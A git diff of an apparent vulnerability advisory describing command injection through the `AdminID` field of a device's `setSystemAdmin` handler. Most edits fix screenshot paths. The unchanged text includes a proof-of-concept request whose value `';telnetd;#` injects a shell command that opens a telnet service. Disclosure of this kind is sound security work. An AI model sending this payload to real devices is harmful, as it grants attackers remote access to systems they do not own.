@@ -12,15 +12,15 @@ A command injection vulnerability exists in the `setSystemAdmin` function of the
 
 ### Vul Details
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-06-14-33-01-d54d4e99-47fd-4bb1-aba0-be4328dedb64.png)
+![]../main/images/2026-02-06-14-33-01-d54d4e99-47fd-4bb1-aba0-be4328dedb64.png)
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-06-14-33-14-d598ade2-b784-48dc-a1cf-2f5378acbbff.png)
+![](../main/images/2026-02-06-14-33-14-d598ade2-b784-48dc-a1cf-2f5378acbbff.png)
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-06-14-33-21-9c908d8d-8d1c-4222-b919-5b93750cb660.png)
+![](../main/images/2026-02-06-14-33-21-9c908d8d-8d1c-4222-b919-5b93750cb660.png)
 
 The function then performs a further check on `AdminID`. However, `checkrangestring` only removes HTML whitespace characters from the input string and limits the input length to a minimum of 1 character and a maximum of 12 characters, without restricting the content.
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-06-14-35-07-24e59410-ce28-47b7-a8ed-cf0fee6e0fb7.png)
+![](../main/images/2026-02-06-14-35-07-24e59410-ce28-47b7-a8ed-cf0fee6e0fb7.png)
 
 The `AdminID` value originates directly from attacker-controlled input. Because the input is not properly restricted, it is directly inserted into shell commands, allowing attackers to construct an `AdminID` that triggers arbitrary command execution.
 
@@ -46,6 +46,7 @@ Priority: u=0, i
 ReplySuccessPage=advanced.htm&ReplyErrorPage=errradv.htm&AdminID=';telnetd;#&UserID1=&UserID2=&UserID3=&UserID4=&UserID5=&UserID6=&UserID7=&UserID8=&AdminPassword=536b63634c1263cb2363bec763ed0763c7186363c312630423639ac7639a0763c7186363c312630423639ac7639a0763c7186363c312630423639ac7639a0763&SessionKey=1770348129&ConfigSystemAdmin=Apply
 ```
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-06-14-40-04-image.png)
+![](../main/images/2026-02-06-14-40-04-image.png)
 
 The telnetd service is already running and can be connected remotely.
+
